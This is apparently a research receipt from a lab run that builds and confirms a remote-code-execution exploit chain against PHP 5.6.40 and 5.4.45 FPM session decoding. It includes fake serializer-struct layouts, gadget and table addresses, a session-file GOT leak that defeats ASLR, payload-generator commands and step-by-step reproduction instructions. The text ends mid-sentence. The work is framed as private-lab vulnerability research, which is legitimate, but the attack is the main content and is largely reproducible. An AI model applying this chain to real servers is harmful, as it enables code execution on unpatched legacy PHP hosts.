# PHP 5.x session decode slot → libc `system` (5.6.40 / 5.4.45)

- Receipt: `php5exec_20261022_0131`
- Date: 2026-10-22
- Scope: live private FPM labs, PHP 5.6.40 and 5.4.45, non-PIE `ET_EXEC`
  builds with DWARF. Offline/private, `127.0.0.1` only. Two lab phases:
  ASLR off (`setarch -R`) and ASLR on with a session-file libc leak.
- Geometry source receipt: `/tmp/opencode/research/php5geo_20261022_0045/`
  (copied here as `phase/zifsys5.json` and
  `phase/geometry_receipt_README.md`).

## Executive summary

The 5.x session decode-slot call is real and reachable:

- **5.6.40**: the `php_binary` decode slot was overwritten with the exact libc
  `system` pointer. A session file whose raw bytes are a shell command
  executed the command (`/tmp/php5_system56_marker`) and the worker survived.
- **5.4.45**: the same test on the corrected `php_binary` decode slot
  (`ps_serializers[1].decode`, `0x79edc8`) executed
  `/tmp/php5_system54_marker`; the worker survived.
- **Native 5.6.40 RCE with worker survival**: a 1024-byte session file
  overwrote the stale `php_unserialize_data` and its fake `var_entries`
  blocks, used the R: dtor pointer write to set `PS(serializer)` to a fake
  struct in the second `s_read` buffer, and had the second decode call libc
  `system` on the file bytes. Markers `/tmp/p5n` and `/tmp/p5r` were created;
  workers 175538 and 185617 survived. The real `ps_serializers` table was
  never modified; gdb only observed the decode calls.
- **Native 5.4.45 RCE with worker survival**: the same two-record chain with
  5.4 offsets (`F1+8 = 0x4b16b1`, `F1+0x10 = system`) executed
  `/tmp/p54n_v2`; worker 589497 survived and `ps_serializers[1].decode`
  stayed `0x4ae189`. Payload `phase/sess_native54.payload`.
- **ASLR-on libc leak, both versions**: a 1024-byte `php_binary` session
  file overwrote the stale `BG(unserialize)` `php_unserialize_data` P inside
  the first `s_read` buffer and made the normal session encode serialize
  4096 bytes of the non-PIE binary's relocated GOT into the session file.
  The file was fetched over HTTP: 87 GOT entries (5.6.40) and 84 (5.4.45)
  agree on one libc base, `0x7f0f89590000` / `0x7f62abd95000`, giving
  `system = base + 0x53090` (`0x7f0f895e3090` / `0x7f62abde8090`).
- **ASLR-on decode-slot `system`**: the leak-derived `system` was written to
  the binary's `ps_serializers[].decode` slot; markers
  `/tmp/php5_aslr56_marker` and `/tmp/php5_aslr54_marker` were created and
  both workers survived the trigger and served a follow-up request.
- **ASLR-on native chain, both versions**: with the leak-derived `system` in
  a fake `PS(serializer)` in the second `s_read` buffer, markers
  `/tmp/php5_aslr56_native` and `/tmp/php5_aslr54_native` were created;
  workers 951888 and 952659 survived; no table byte was written. The libc
  base used by every ASLR-on `system` call came from the served session-file
  leak, not from gdb.
- **Crash variant**: with the original `php_binary` encode pointer, the same
  native file created the marker but the worker died after execution in
  `ps_close_files` (`ext/session/mod_files.c:326`) because the R: pre-push
  corrupts `PS(mod_user_implemented)` at `0x82e5b8`. The survival gadget
  `0x4b4728` zeroes that qword and returns through `php_session_encode`'s
  epilogue.
- **Binary imports**: neither binary imports `system`/`execve`; both import
  `popen`, but its second argument is `mode`, which receives the integer
  `vallen` from `decode(val, vallen)`, so `popen` cannot be driven directly.
  Native 5.x RCE therefore needs a libc base; the ASLR-off lab supplies it
  directly, and the ASLR-on phase derives it from the session-file leak.
- **`zif_system` fallback**: not needed. The geometry receipt's G6 result
  stands: `zif_system` uses the 5.x internal-function ABI (`ht`,
  `return_value`, ...), not `(char *, int)`, so it is not a valid decode-slot
  target; the geometry analysis shows the failure path writes `vallen` as a
  pointer. libc `system` is the compatible target.

**Final 5.x verdict:** the decode-slot `system` shape is confirmed on both
5.6.40 and 5.4.45, and native code execution with worker survival is
confirmed on both versions, first with ASLR off and then with ASLR on using
the session-file libc leak. The 8.5-style direct dtor write to
`ps_serializers[].decode` does not transfer to 5.x (the 5.x dtor stores
8-byte `zval *` pointers, not typed zvals), but the same pointer write
enables the `PS(serializer)` fake-struct pivot. No `system`/`execve` PLT
exists; `popen` is signature-incompatible. The required libc base is
recoverable from a 4096-byte GOT overread written by the session encoder
and served from the session directory, so ASLR does not block the chain.

## Lab topology

| Item | 5.6.40 | 5.4.45 |
|---|---|---|
| Binary | `build/php-5.6.40/sapi/fpm/php-fpm` | `build/php-5.4.45/sapi/fpm/php-fpm` |
| sha256 | `b9261e1c...3703723` | `60e22576...724abaf` |
| ELF | `ET_EXEC`, x86-64, non-PIE, DWARF | `ET_EXEC`, x86-64, non-PIE, DWARF |
| FPM port | `127.0.0.1:45256` | `127.0.0.1:45254` |
| Master / worker | 164972 / 185617 (also 175538) | 183820 / 183822 (later 585207 / 589497) |
| ASLR | off (`setarch -R`) | off (`setarch -R`) |
| libc `system` | `0x7ffff7d1c090` | `0x7ffff7d1c090` |
| libc base | `0x7ffff7cc9000` | `0x7ffff7cc9000` |
| Serializer | `php_binary` | `php_binary` |
| Save path | `sess56/` | `sess54/` |

### ASLR-on labs

Two additional pools were started from the same binaries **without**
`setarch -R`, each with a web-served session directory and a
`python3 -m http.server` static server:

| Item | 5.6.40 | 5.4.45 |
|---|---|---|
| FPM port | `127.0.0.1:45270` | `127.0.0.1:45272` |
| HTTP port | `127.0.0.1:45271` | `127.0.0.1:45273` |
| Master / current worker | 885439 / 951888 | 885474 / 952659 |
| Config | `phase/conf/fpm56aslr.conf` | `phase/conf/fpm54aslr.conf` |
| Web root / save path | `aslr56/root`, `aslr56/root/sess` | `aslr54/root`, `aslr54/root/sess` |
| `/proc/<worker>/personality` | `00000000` | `00000000` |
| `randomize_va_space` | 2 | 2 |
| Leak-derived libc base | `0x7f0f89590000` | `0x7f62abd95000` |
| Leak-derived `system` | `0x7f0f895e3090` | `0x7f62abde8090` |

The non-PIE binaries and their globals stay at fixed addresses
(`0x400000`-based); only libc/heap/stack are randomised.

Configs: `phase/conf/fpm56b.conf`, `phase/conf/fpm54.conf`,
`phase/conf/fpm56aslr.conf`, `phase/conf/fpm54aslr.conf`.
Scripts: `phase/root56/`, `phase/root54/`, `phase/root56aslr/`,
`phase/root54aslr/`.
Client: `phase/fcgi_client.py`.

The originally planned 5.6 port `45101` was contaminated by an unrelated
`aslrsame` FPM pool, so the clean 5.6 lab used `45256` and the 5.4 lab used
`45254`. The shared ports `4052217`, `4052937`, `4053032`, `4054145` were
never used.

## Per-lever results

### A. Decode slot = libc `system` (gdb-assisted table write)

| | 5.6.40 | 5.4.45 |
|---|---|---|
| Table entry | `ps_serializers[2]` `0x816df0`, decode `0x816e00` | `ps_serializers[1]` `0x79edb8`, decode `0x79edc8` |
| Set value | `0x7ffff7d1c090` (`system`) | `0x7ffff7d1c090` (`system`) |
| Session file | `sess_sys56b`: `touch /tmp/php5_system56_marker\n\0` | `sess_sys54b`: `touch /tmp/php5_system54_marker\n\0` |
| Trigger | `PHPSESSID=sys56b`, `start56.php` | `PHPSESSID=sys54b`, `start54.php` |
| Marker | `/tmp/php5_system56_marker` created | `/tmp/php5_system54_marker` created |
| Worker | 185617 survived | 183822 survived |
| Restore | `0x816e00 = 0x4af399` | `0x79edc8 = 0x4ae189` |
| Log | `phase/5.6_decode_slot_system_gdb.log` | `phase/5.4_decode_slot_system_gdb.log` |

The decode call passes `(val, vallen)`; libc `system(const char *)` uses the
first argument and ignores the second. The raw session file is the command
string (the `\n` and `\0` are harmless). This independently confirms the
decode-slot ABI on both branches.

### B. Native 5.6.40 dtor → `PS(serializer)` → `system`

| | Result |
|---|---|
| Payload | 1024 bytes, `phase/sess_psys5.payload` (marker `/tmp/p5r`) and `phase/sess_psys4.payload` (marker `/tmp/p5n`) |
| Generator | `phase/make_native56.py` |
| Stale P / fake blocks | `P=0x7ffff7cbb710`; `first=0x7ffff7cb9780`; `last=0x7ffff7cb97a0`; `last_dtor=0x7ffff7cb9800` |
| Fake serializer | `F1=0x7ffff7cbc638` (`X2+0x300`); `F1+8=0x4b4728`; `F1+0x10=0x7ffff7d1c090` |
| Dtor K0 | `-17592167765577` (pre-push `0x82e5b8`, top push `0x82e5c0`) |
| First decode | `val=0x7ffff7cbb580`, `vallen=1024`, `ser=0x816df0`, `P=0x7ffff7cbb710` |
| Second decode | `val=0x7ffff7cbc338`, `vallen=1024`, `ser=F1`, `F1+0x10=system` |
| Execution | vfork child 184679 (run 1), 185715 (run 2) |
| Marker | `/tmp/p5n`, `/tmp/p5r` created |
| Worker | 175538, 185617 survived |
| Table | untouched (`0x816df0`: encode `0x4afaff`, decode `0x4af399`) |
| Final flush | 0-byte session file; `s_close` safe |
| Logs | `phase/5.6_native_gdb_psys4.log`, `phase/5.6_native_gdb_psys5.log`, `phase/5.6_native_survival_check.log` |

The first decode's R: sets `PS(serializer)=F1`; the string top push sets
`PS(http_session_vars)` to a string zval, so the first update skips the flush.
The second `s_read` reloads the file into `X2`, populating `F1` with `system`;
the second decode executes it. The survival encode gadget `0x4b4728` zeroes
`PS(mod_user_implemented)`/`PS(mod_user_is_open)` at `0x82e5b8` and returns
through `php_session_encode`'s epilogue.

### C. Native crash variant (no survival gadget)

| | Result |
|---|---|
| Payload | same layout, `F1+8 = 0x4afaff` (real `php_binary` encode) |
| Marker | `/tmp/p5n` created |
| Worker | 174540 died |
| Crash | SIGSEGV in `ps_close_files` at `ext/session/mod_files.c:326` (`ps_files_close(data)` with `PS(mod_data)==NULL`, `PS(mod_user_implemented)!=0`) |
| Log | `phase/5.6_native_crash_gdb_psys3.log` |

The crash is post-execution cleanup, not the decode path: the marker is
already created. It is caused by the R: pre-push at `PS(serializer)-8`
(`0x82e5b8`) writing a zval pointer over
`PS(mod_user_implemented)`/`PS(mod_user_is_open)`. The survival gadget
repairs exactly this.

### D. Direct dtor write to `ps_serializers[].decode`

**Blocked on 5.x.** The 5.x dtor slot is `zval *data[1024]`; the store is an
8-byte `zval *`, not a typed 16-byte zval. Aiming the slot at the table's
decode field writes a heap pointer, not `system`; the engine would call a
heap zval as code. The R: `Z_ADDREF_PP`/`Z_SET_ISREF_PP` metadata writes also
corrupt a fake zval at `+0x10/+0x15`. The working primitive is the
`PS(serializer)` pointer write plus a fake struct in the second buffer.
See `phase/abi_5x_analysis.md`.

### E. Binary `system` / `popen` / `execve` PLT/GOT

| | 5.6.40 | 5.4.45 |
|---|---|---|
| `system` import | no | no |
| `execve` / `execv` / `execvp` / `posix_spawn` | no | no |
| `popen@GLIBC_2.2.5` | `popen@plt=0x417f30`, GOT `0x816780` | `popen@plt=0x417ee0`, GOT `0x79e758` |
| `zif_system` (defined) | `0x4f195f` | `0x4edbdb` |
| `zif_passthru` (defined) | `0x4f1970` | `0x4edbec` |
| `php_exec` (defined) | `0x4f14ec` | `0x4ed775` |
| `zend_eval_string` / `l` | `0x592000` / `0x591cf5` | `0x58ae00` / `0x58aaf4` |
| `readelf -h` type | `EXEC` (non-PIE) | `EXEC` (non-PIE) |

`popen(const char *command, const char *mode)` gets `decode`'s second argument
(`vallen`, an integer) as `mode`; that is not a valid string pointer, so the
decode call cannot execute the command through `popen`. There is no
`system`/`execve` PLT/GOT, so the libc `system` address is required. Evidence:
`phase/imports_5.6.txt`, `phase/imports_5.4.txt`, `phase/5.6_geometry.txt`,
`phase/5.4_geometry.txt`.

### F. `zend_eval_string` / `zif_system` / `php_exec` / `assert` fallbacks

Not needed: libc `system` worked. The `zif_system` path is ABI-incompatible
with the decode call and is documented in `phase/abi_5x_analysis.md` and the
geometry receipt. `zif_passthru` is the same internal-function ABI.
`zend_eval_string`/`php_exec` would need a different calling convention and
were not exercised.

### G. Native 5.4.45 dtor → `PS(serializer)` chain (ASLR off)

| Item | Value |
|---|---|
| Worker / lab | 589497, port 45254, `setarch -R` |
| Payload | `phase/sess_native54.payload`, sha256 `c61199613a656ef743f5032a501a31d0d661efe89f5feb3ea6c9d41c74f4171f` |
| Generator | `phase/make_native54.py --marker /tmp/p54n_v2 --x1 0x7ffff7cbb5b0 --x2 0x7ffff7cbc320 --poff 0x1a8` |
| `X1` / `P` | `0x7ffff7cbb5b0` / `0x7ffff7cbb758` (`poff 0x1a8`) |
| `X2` / `F1` | `0x7ffff7cbc320` / `0x7ffff7cbc620` (`X2+0x300`) |
| `F1+0x08` / `F1+0x10` | `0x4b16b1` (survival gadget) / `0x7ffff7d1c090` (`system`) |
| Second decode | `val=0x7ffff7cbc320 vallen=1024 ser=0x7ffff7cbc620` |
| Execution | `[Detaching after vfork from child process 589987]` |
| Marker | `/tmp/p54n_v2` created at 02:42:29 |
| Worker after | 589497 alive, `trigger54.php` 200 |
| Session file | `sess54/sess_nat54v1` 0 bytes |
| Table | `0x79edc8` unchanged `0x4ae189` |
| Logs | `phase/5.4_native_gdb_v3.log`, `phase/5.4_native_survival_check.log` |

The chain is identical to B with 5.4 symbols and the 5.4 survival gadget
`0x4b16b1`; gdb only observed the two decode calls. The post-run read shows
`PS(serializer)=0x7ffff7cbc620` (fake F1), `BG(unserialize)=NULL` after
RINIT, and the original decode pointer.

### H. ASLR-on: session-file libc leak (both versions)

The payload is a 1024-byte `php_binary` session file, read into `s_read`'s
`emalloc(file_size)` buffer **X1**. The stale `BG(unserialize)` `var_hash`
pointer **P** left by `plant.php` lies inside that buffer at `X1 + poff`, so
the file bytes overwrite the fake `php_unserialize_data`:

```
P+0x00 first      = X1 + 0x200 - 0x2000
P+0x08 last       = X1 + 0x220 - 0x2000
P+0x10 first_dtor = 0
P+0x18 last_dtor  = X1 + 0x380 - 0x2000   (doff = 0x380)
```

Record 1 is `0x20 <32-byte key> R:1057;`. `var_access(1056)` reaches the
fake `first->data[1056]` at file offset `0x300`, which holds a pointer to a
fake zval at file offset `0x340`:

```
X1+0x340  value.str.val = 0x815fd0 (5.6) / 0x79dfd0 (5.4)  ; fixed GOT base
X1+0x348  value.str.len = 4096
X1+0x350  refcount      = 0x100000
X1+0x354  type          = IS_STRING (6)
X1+0x355  is_ref        = 0
```

Because the `R:` value is a fake zval pointer stored in the real session
hash, the normal `php_binary` encode serializes it as
`s:4096:"<4096 bytes of relocated GOT>"` and `s_write` persists that into
the session file. The dtor pushes are steered into the fake dtor block at
file offset `0x380` (`used_slots = 0`), so `PS(serializer)` and
`PS(http_session_vars)` are not corrupted and the normal encode runs.

`poff` and `X1` are worker-state dependent, so a probe request is sent first
and read with a gdb breakpoint at `php_session_decode`. The probe crashes
the worker because P is not yet a valid fake structure; FPM starts a fresh
worker from the same master with the same heap layout, and the probe yields
`poff = P - X1`. The same geometry is then used for the real run.

| | 5.6.40 | 5.4.45 |
|---|---|---|
| Probe `val` / `P` | `0x7f0f895825c0` / `0x7f0f89582828` | `0x7f62abd875c0` / `0x7f62abd87768` |
| `poff` | `0x268` | `0x1a8` |
| Leak-run HIT 1 | `val=0x7f0f895825c0 vallen=1024` | `val=0x7f62abd875c0 vallen=1024` |
| Leak-run HIT 2 | `val=0x7f0f89584500 vallen=5435` | `val=0x7f62abd89500 vallen=5435` |
| Leak file | `phase/aslr56_session_leak.bin`, 5435 bytes, sha256 `4299f2a3...13b8d1b0` | `phase/aslr54_session_leak.bin`, 5435 bytes, sha256 `b28c7ddb...8cce8503` |
| GOT base | `0x815fd0` | `0x79dfd0` |
| GOT entries agreeing on one base | **87** | **84** |
| Derived libc base | `0x7f0f89590000` | `0x7f62abd95000` |
| Derived `system` (`+0x53090`) | `0x7f0f895e3090` | `0x7f62abde8090` |
| Logs | `phase/aslr56_gdb_probe.log`, `phase/aslr56_gdb_leak.log` | `phase/aslr54_gdb_probe.log`, `phase/aslr54_gdb_leak.log` |

The leak file is fetched over the private static server
(`http://127.0.0.1:45271/sess/sess_leak56`, `...45273/sess/sess_leak54`)
and analysed offline with `phase/analyze_leak.py`; the full relocation match
is `phase/aslr_leak_analysis.txt`. Of the 4096-byte window, 105 (5.6) and
102 (5.4) slots are resolved libc pointers. 87 / 84 of them match the
dynsym-named offset exactly and fix the base; the other 18 on each build are
IFUNC-resolved string/memory routines (`memset`, `memcpy`, `strlen`, ...)
that point at an optimized implementation inside the same libc. The
remaining slots are unresolved PLT trampolines (`0x4xxxxx`) or one zero
slot, so they are not used. The `system` offset `0x53090` agrees with the
ASLR-off lab (`0x7ffff7d1c090 - 0x7ffff7cc9000`), an independent
consistency check.

**Known side effect:** after the leaking update, the rfc1867 END update
re-reads the rewritten 5435-byte file into a new `s_read` buffer while the
stale P still points into the freed 1024-byte chunk. That chunk has been
reused by the serialized data, so the second decode reads garbage
`var_entries` pointers and the worker dies with SIGSEGV **after** the leak
has been written and flushed. The leak is unaffected: the file is on disk
and was fetched over HTTP after the crash. FPM replaced the worker
automatically.

### I. ASLR-on: decode slot = leak-derived `system`

The existing table-write lever was re-run on ASLR-on workers with the
leak-derived `system`:

| | 5.6.40 | 5.4.45 |
|---|---|---|
| Worker | 948800 | 950266 |
| Table decode slot | `0x816e00` | `0x79edc8` |
| Written | `0x7f0f895e3090` | `0x7f62abde8090` |
| Session file | `sess_sys56a`: `touch /tmp/php5_aslr56_marker\n\0` | `sess_sys54a`: `touch /tmp/php5_aslr54_marker\n\0` |
| Trigger | `PHPSESSID=sys56a`, `start56.php` | `PHPSESSID=sys54a`, `start54.php` |
| Marker | `/tmp/php5_aslr56_marker` created | `/tmp/php5_aslr54_marker` created |
| Worker after | survived; follow-up `info.php` 200 at 02:52:44 | survived; `trigger54.php` 200 at 02:52:44 |
| Restored decode | `0x4af399` | `0x4ae189` |
| Log | `phase/aslr56_system.log` | `phase/aslr54_system.log` |

Both workers were later SIGKILLed intentionally (02:53:52 / 02:54:38) to
obtain clean workers for the native-chain measurement; the survival claim
rests on the post-trigger follow-up request, not on those PIDs still being
alive now.

### J. ASLR-on: native two-record chain (no table write)

The native chain was repeated with the leak-derived `system`:

1. **Measure X2** with `phase/aslr56_measure.payload` /
   `phase/aslr54_measure.payload` (`F1 = X1+0x300`, decode/encode = the real
   `php_binary` pointers). The measurement trigger crashes the worker after
   the second `php_session_decode` hit; gdb only reads the address.
2. **Real run** with `phase/aslr56_native.payload` /
   `phase/aslr54_native.payload` (`F1 = X2+0x300`, `F1+0x08` = survival
   gadget, `F1+0x10` = leak-derived `system`).

| | 5.6.40 | 5.4.45 |
|---|---|---|
| `X1` first buffer | `0x7f0f895825c0` | `0x7f62abd875c0` |
| `P` (`X1+poff`) | `0x7f0f89582828` (`+0x268`) | `0x7f62abd87768` (`+0x1a8`) |
| `X2` second buffer | `0x7f0f89583350` (`X1+0xd90`) | `0x7f62abd88330` (`X1+0xd70`) |
| `F1 = X2+0x300` | `0x7f0f89583650` | `0x7f62abd88630` |
| `F1+0x08` survival | `0x4b4728` | `0x4b16b1` |
| `F1+0x10` decode | `0x7f0f895e3090` | `0x7f62abde8090` |
| Measurement worker | 951691 (SIGSEGV after hit, expected) | 952493 (SIGSEGV after hit, expected) |
| Real-run worker | 951888 alive, trigger response `status=1` | 952659 alive, trigger response `status=1` |
| Marker | `/tmp/php5_aslr56_native` created | `/tmp/php5_aslr54_native` created |
| Session file after | 0 bytes | 0 bytes |
| GDB log | `phase/aslr56_gdb_native.log` | `phase/aslr54_gdb_native.log` |

The gdb HIT 2 dumps show the clean fake struct in X2:

```
5.6: 0x7f0f89583650: 0x7f0f89583650 0x00000000004b4728
     0x7f0f89583660: 0x00000000007f0f895e3090
5.4: 0x7f62abd88630: 0x7f62abd88630 0x00000000004b16b1
     0x7f62abd88640: 0x000000007f62abde8090
```

No `ps_serializers` byte was written in these runs; gdb only observed the
two decode calls. The libc base required by the chain came exclusively from
the served session-file leak.

## Exact 5.x ABI result

- `var_entries { zval *data[1024]; long used_slots; void *next; }`:
  `data` entries are 8-byte pointers; `used_slots` at `+0x2000`, `next` at
  `+0x2008`.
- `php_unserialize_data { first, last, first_dtor, last_dtor }` at
  `+0x00/+0x08/+0x10/+0x18`.
- `var_push_dtor`: addref then pointer store; `var_push_dtor_no_addref`:
  pointer store. The R: pre-push stores the old `current` pointer, then the
  top push stores the referenced zval pointer.
- 5.x is **pointer-only**; the 8.5 G2 typed-value store (16-byte typed zval
  with an arbitrary `IS_LONG`) does not exist. The 8.5 G6 `zif_system`
  internal-function call also does not transfer.
- The decode call is `decode(char *val, int vallen)`. A libc
  `system(const char *)` / `passthru`-style function is compatible; the
  internal `zif_system` is not.
- The dtor pointer write is still useful: it writes a pointer to a fake
  `ps_serializer` struct into `PS(serializer)`. The fake struct's `+0x10`
  (`decode`) is libc `system`. The fake struct must be in the second
  `s_read` buffer so the first decode's addref/is_ref metadata writes are
  overwritten by the second read.
- The R: pre-push at `PS(serializer)-8` corrupts the adjacent
  `mod_user_implemented`/`mod_user_is_open` flags. Survival requires the
  table-write lever (no dtor corruption) or a repair gadget. The 5.6 gadget
  is `0x4b4728` and the 5.4 gadget is `0x4b16b1`; each zeroes the flags and
  returns through `php_session_encode`'s epilogue.
- Steering the dtor pushes into a fake `var_entries` block inside the file
  buffer (`used_slots = 0`) leaves `PS(serializer)` intact and therefore
  keeps the normal encode path alive. A fake `IS_STRING` zval with
  `value.str.val` = fixed binary address and `len = 4096` makes that encode
  write a 4096-byte GOT overread into the session file, which is the ASLR
  leak.

## Evidence index (`phase/`)

| File | Contents |
|---|---|
| `5.6_decode_slot_system_gdb.log` | 5.6 table decode = `system`, marker, worker survival, restore |
| `5.4_decode_slot_system_gdb.log` | 5.4 table decode = `system`, marker, worker survival, restore |
| `5.6_native_gdb_psys4.log` | native run 1: both decode hits, F1/system, vfork child 184679 |
| `5.6_native_gdb_psys5.log` | native run 2: both decode hits, F1/system, vfork child 185715 |
| `5.6_native_crash_gdb_psys3.log` | native crash variant: marker + SIGSEGV in `ps_close_files` |
| `5.6_native_survival_check.log` | post-run globals, table untouched, follow-up request |
| `native_5.6_chain.md` | detailed native chain, payload layout, gadget, crash analysis |
| `abi_5x_analysis.md` | 5.x dtor/decode ABI, G2/G6 transfer analysis |
| `make_native56.py` | deterministic payload generator |
| `sess_psys4.payload`, `sess_psys5.payload` | pre-trigger 1024-byte native payloads (`/tmp/p5n`, `/tmp/p5r`) |
| `5.6_geometry.txt`, `5.4_geometry.txt` | symbols, table, zif_system, gadget, popen@plt |
| `imports_5.6.txt`, `imports_5.4.txt` | `readelf`/`nm`/`objdump` import evidence |
| `conf/fpm56b.conf`, `conf/fpm54.conf` | FPM lab configs (ports 45256 / 45254) |
| `root56/`, `root54/` | PHP trigger/plant/info scripts |
| `fcgi_client.py`, `multipart.bin`, `lab.env` | FastCGI client and upload-progress body |
| `gdb56_native_breakpoint.txt`, `gdb56_peek_state.txt` | gdb scripts used for the decode hits and stale P check |
| `zifsys5.json`, `geometry_receipt_README.md` | 5.x geometry source receipt |
| `aslr_on_phase.md` | full ASLR-on phase writeup (leak, decode slot, native chain, 5.4 ASLR-off) |
| `mk_leak.py`, `analyze_leak.py` | leak payload generator and GOT/libc-base analyser |
| `mk_native_aslr.py`, `make_native54.py` | geometry-parameterised native payload generators (ASLR-on and 5.4) |
| `aslr56_session_leak.bin`, `aslr54_session_leak.bin` | 5435-byte session files fetched over HTTP (leak artifacts) |
| `aslr_leak_analysis.txt` | 87 (5.6) / 84 (5.4) GOT relocation matches, libc base and `system` |
| `aslr56_leak.payload`, `aslr54_leak.payload` | pre-trigger 1024-byte leak payloads |
| `aslr56_measure.payload`, `aslr54_measure.payload` | X2 measurement payloads (`F1 = X1+0x300`) |
| `aslr56_native.payload`, `aslr54_native.payload` | ASLR-on native payloads (leak-derived `system`) |
| `aslr56_gdb_probe.log`, `aslr54_gdb_probe.log` | `poff` probe, worker crash expected |
| `aslr56_gdb_leak.log`, `aslr54_gdb_leak.log` | leak decode hits and clobbered P on the second decode |
| `aslr56_gdb_measure.log`, `aslr54_gdb_measure.log` | X2 measurement hits |
| `aslr56_gdb_native.log`, `aslr54_gdb_native.log` | ASLR-on native runs: F1 fields, `system`, survival |
| `aslr56_system.log`, `aslr54_system.log` | ASLR-on decode-slot marker/survival output |
| `conf/fpm56aslr.conf`, `conf/fpm54aslr.conf` | ASLR-on pool configs (ports 45270 / 45272) |
| `root56aslr/`, `root54aslr/` | ASLR-on trigger/plant scripts |
| `sess_native54.payload` | 5.4 native payload (sha256 `c6119961...f4171f`) |
| `5.4_native_gdb_v3.log`, `5.4_native_survival_check.log` | 5.4 ASLR-off native run and survival check |

## Reproducibility (private lab)

1. Build/obtain the non-PIE FPM binaries (geometry receipt).
2. Start the pools with ASLR off:
   `setarch -R <php-fpm> -y phase/conf/fpm56b.conf` and
   `setarch -R <php-fpm> -y phase/conf/fpm54.conf`.
3. Decode-slot table lever:
   - attach gdb to the worker, set `*(uint64_t*)0x816e00 = system` (5.6) or
     `*(uint64_t*)0x79edc8 = system` (5.4);
   - write the raw command to `sess56/sess_sys56b` / `sess54/sess_sys54b`;
   - request `start56.php` / `start54.php` with `PHPSESSID=sys56b` /
     `sys54b`;
   - check the marker and worker; restore the original decode pointer.
4. Native 5.6 lever:
   - start a clean worker; run `plant.php` (stale `P`, level 1);
   - generate `sess_psys5` with `make_native56.py` and place it in the save
     path;
   - attach gdb with the breakpoint script (observation only), send the
     upload-progress multipart request with `PHPSESSID=psys5`;
   - check `/tmp/p5r` and the worker; the session file becomes 0 bytes.
5. ASLR-on labs:
   - start the same binaries **without** `setarch -R` with
     `phase/conf/fpm56aslr.conf` / `phase/conf/fpm54aslr.conf`, plus
     `python3 -m http.server 45271 --directory aslr56/root` and
     `python3 -m http.server 45273 --directory aslr54/root`;
   - probe `poff`: run `plant.php`, attach gdb at `php_session_decode`,
     trigger once, record `val`/`P`, set `poff = P - val` (the probe worker
     crashes; FPM replaces it with the same heap layout);
   - build the leak payload with `phase/mk_leak.py --x1 <X1> --poff <poff>
     --got 0x815fd0` (5.6) or `--got 0x79dfd0` (5.4), place it as
     `sess_leak56` / `sess_leak54`, run `plant.php`, send the
     upload-progress multipart request, then fetch
     `http://127.0.0.1:45271/sess/sess_leak56` (or `45273/.../sess_leak54`);
   - run `phase/analyze_leak.py` on the fetched file to get the libc base
     and `system = base + 0x53090`.
6. ASLR-on decode slot: repeat step 3 with the leak-derived `system`
   (`sess_sys56a` / `sess_sys54a`, `start56.php` / `start54.php`).
7. ASLR-on native chain:
   - measurement payload `mk_native_aslr.py --x1 <X1> --poff <poff>
     --f1 <X1+0x300> --encode <real encode> --decode <real decode>`; the
     trigger worker crashes after the second decode hit, gdb gives `X2`;
   - real payload with `--f1 <X2+0x300> --encode <gadget>
     --decode <leak-derived system>`; trigger, check the marker and the
     worker, and confirm the session file is 0 bytes.
8. Hashes: `sha256sum -c SHA256SUMS`.

## Caveats

- The ASLR-off phase uses `setarch -R`; libc `system` is the fixed
  `0x7ffff7d1c090` there. The ASLR-on phase uses the session-file leak and
  does not depend on a fixed libc address. The non-PIE binary globals and
  gadgets stay fixed in both phases.
- The 5.6 native chain's `PS(serializer)=F1` persists in the worker after the
  request. The next session decode in the same worker can still use `F1`
  while `X2` remains mapped; a clean worker restart resets it. The same is
  true of the 5.4 native chain.
- The 1024-byte files `phase/sess_psys4.payload`, `phase/sess_psys5.payload`,
  `phase/sess_native54.payload` and the `phase/aslr*_*.payload` files are the
  pre-trigger payloads. After a successful native run the lab session file
  is 0 bytes (the empty-session flush); this is expected and is not a
  truncation of the evidence copy.
- The 5.6 native payload's command is the raw file buffer from offset 0; the
  key-length byte and left padding are spaces, and the `#` comments the
  serialized tail. The first NUL inside the fake struct terminates the string.
- The 5.4 native chain **was** executed (section G). Its payload in
  `phase/sess_native54.payload` was regenerated from the recorded parameters
  and matches the executed payload hash
  `c61199613a656ef743f5032a501a31d0d661efe89f5feb3ea6c9d41c74f4171f`;
  the earlier non-matching variant with marker `/tmp/p54native` was replaced.
- The leak stage always crashes the worker on the second rfc1867 decode
  because the freed 1024-byte `s_read` chunk holding stale P is reused. The
  leak file has already been written and flushed at that point and is
  fetched over HTTP afterwards; the crash is documented, not a leak failure.
- Heap geometry is worker-state dependent and must be re-measured per
  worker/request: `poff` was `0x268` (5.6 ASLR-on) vs `0x1a8` (5.4
  ASLR-on), and `X2-X1` was `0xd90` vs `0xd70`. Do not reuse the values
  across versions or fresh workers.
- The ASLR-on leak assumes the attacker can read the rewritten session file
  (in this lab it is served by a private static HTTP server, F14-style). If
  the save path is not web-readable, the same encode primitive still writes
  the GOT bytes into the session file, but a separate file-read primitive is
  needed to exfiltrate them.
- The ASLR-on decode-slot workers 948800 / 950266 survived the trigger and
  served a follow-up request, then were intentionally SIGKILLed to obtain
  clean workers for the native measurement. Their survival claim does not
  rest on those PIDs being alive after that point.
- Preserve the original geometry receipt and logs; this receipt only adds the
  live-execution phase.

## Final 5.x verdict

The decode-slot call is the transferable 5.x primitive: **libc `system` at
`PS(serializer)->decode` executes with `(val, vallen)` on both 5.6.40 and
5.4.45**, marker and worker survival confirmed with ASLR off and with ASLR
on. The native path using the stale dtor pointer write → fake
`PS(serializer)` struct in the second `s_read` buffer → libc `system` is
confirmed on 5.6.40 (twice, crash variant also characterized) and
on 5.4.45, with worker survival via the non-PIE encode gadgets `0x4b4728`
(5.6) and `0x4b16b1` (5.4).
The 8.5 G2 typed-value dtor write and the 8.5 G6 `zif_system` call do not
transfer to 5.x; the 5.x dtor is pointer-only and `zif_system` is
internal-function ABI. No `system`/`execve` PLT/GOT exists; `popen` is
signature-incompatible. The libc base is recoverable from a session file:
the same dtor steering keeps the normal `php_binary` encode alive, a fake
`IS_STRING` zval makes it serialize 4096 bytes of relocated GOT, and the
served file yields one consistent libc base (87 matching GOT entries on
5.6, 84 on 5.4). With that leak, both the decode-slot table write and the
native chain execute `system` on ASLR-on pools. ASLR is therefore not a
blocker for the 5.x native chain in this configuration.

## Curated copy

Source run: `/tmp/opencode/research/php5exec_20261022_0131`
(202-entry `SHA256SUMS`, 202/202 verified before curation; the source manifest
file hash is `76719092a0d9c8e0c43684036cf1f1531cdcdfa87c6733240263d9d5b83e76af`).

Copied here: this README, `summary.json`, `conf/`, `log/`, `phase/`, the
